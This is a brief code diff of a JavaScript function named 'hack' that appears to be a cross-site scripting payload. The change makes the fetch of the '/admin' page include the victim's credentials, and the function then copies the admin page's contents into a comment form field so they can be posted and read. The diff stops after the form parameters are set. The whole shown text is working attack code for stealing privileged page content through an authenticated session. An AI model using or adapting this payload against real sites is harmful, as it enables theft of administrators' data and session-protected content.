@@ -1,5 +1,5 @@
 async function hack() {
-const admin = await (await fetch("/admin")).text();
+const admin = await (await fetch("/admin", {credentials: "include"})).text();
 const test = new URLSearchParams();
 test.set("name","Name1123");
 test.set("comment",admin);
